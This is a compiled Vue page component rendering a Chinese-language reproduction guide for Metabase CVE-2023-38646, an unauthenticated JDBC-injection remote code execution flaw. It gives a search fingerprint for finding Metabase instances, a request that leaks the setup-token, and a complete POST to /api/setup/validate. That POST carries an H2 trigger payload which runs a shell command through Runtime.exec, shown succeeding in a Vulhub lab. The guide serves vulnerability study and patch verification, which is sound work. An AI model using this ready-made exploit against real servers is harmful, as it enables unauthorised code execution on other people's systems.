import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as n,d as a,e as o}from"./app-58e4a7d6.js";const r={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Metabase是一个开源的数据分析平台。在其0.46.6版本及以前，存在一处远程代码执行漏洞，未授权的用户可以使用JDBC注入在服务器上执行任意代码。",-1),p=e("p",null,"参考链接：",-1),v={href:"https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://blog.calif.io/p/reproducing-cve-2023-38646-metabase",target:"_blank",rel:"noopener noreferrer"},b={href:"https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA",target:"_blank",rel:"noopener noreferrer"},g=o(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Metabase&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase server 0.46.6：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，填写初始账号密码，并且跳过后续的数据库填写的步骤即可完成安装：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230803144456721.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先，需要先访问<code>/api/session/properties</code>来获取Metabase的<code>setup-token</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /api/session/properties HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230803145405274.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>要利用漏洞，必须要获取这个Token。</p><p>接着，将刚才获取的<code>[setup-token]</code>替换进下面这个请求后发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/setup/validate HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 739

{
    &quot;token&quot;: &quot;[setup-token]&quot;,
    &quot;details&quot;:
    {
        &quot;is_on_demand&quot;: false,
        &quot;is_full_sync&quot;: false,
        &quot;is_sample&quot;: false,
        &quot;cache_ttl&quot;: null,
        &quot;refingerprint&quot;: false,
        &quot;auto_run_queries&quot;: true,
        &quot;schedules&quot;:
        {},
        &quot;details&quot;:
        {
            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;&quot;,
            &quot;advanced-options&quot;: false,
            &quot;ssl&quot;: true,
&quot;init&quot;: &quot;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/success&#39;)\\u000A$$&quot;
        },
        &quot;name&quot;: &quot;an-sec-research-team&quot;,
        &quot;engine&quot;: &quot;h2&quot;
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230803150105927.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>虽然 response code 为 400，但可以看到，<code>touch /tmp/success</code>已成功在Metabase容器中执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230803150134198.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17);function h(q,_){const i=s("ExternalLinkIcon");return l(),d("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",v,[n("https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/"),a(i)])]),e("li",null,[e("a",m,[n("https://blog.calif.io/p/reproducing-cve-2023-38646-metabase"),a(i)])]),e("li",null,[e("a",b,[n("https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA"),a(i)])])]),g])}const k=t(r,[["render",h],["__file","Metabase 未授权 JDBC 远程代码执行漏洞 CVE-2023-38646.html.vue"]]);export{k as default};
